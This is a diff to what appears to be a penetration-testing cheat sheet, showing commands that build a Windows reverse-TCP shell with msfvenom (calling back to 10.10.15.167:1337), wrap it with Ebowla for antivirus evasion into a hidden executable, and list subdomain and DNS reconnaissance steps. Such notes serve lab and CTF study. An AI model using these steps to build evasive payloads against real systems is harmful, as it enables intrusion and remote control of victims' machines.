@@ -758,9 +758,9 @@ root@kali:$ sudo apt install golang wine -y
 root@kali:$ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
 root@kali:$ sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.167 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
 root@kali:$ vi genetic.config
-...Edit output_type, payload_type, ENV_VAR...
+...Edit output_type, payload_type, clean_output, [[ENV_VAR]]...
 root@kali:$ python ebowla.py /tmp/rev.exe genetic.config && rm /tmp/rev.exe
-root@kali:$ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe
+root@kali:$ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden]
 [+] output/ebowla-rev.exe
 ```
 
@@ -2118,6 +2118,7 @@ root@kali:$ cp t passwords.txt
 		$ ./subbrute.py example.com
 		$ ./knockpy example.com
 		$ ./dnsrecon.py -d example.com
+	+ Check for DNS Amplification
 * CMS, Stack, Vulns
 	$ whatweb 127.0.0.1
 	+ Shodan/Censys/SecurityTrails
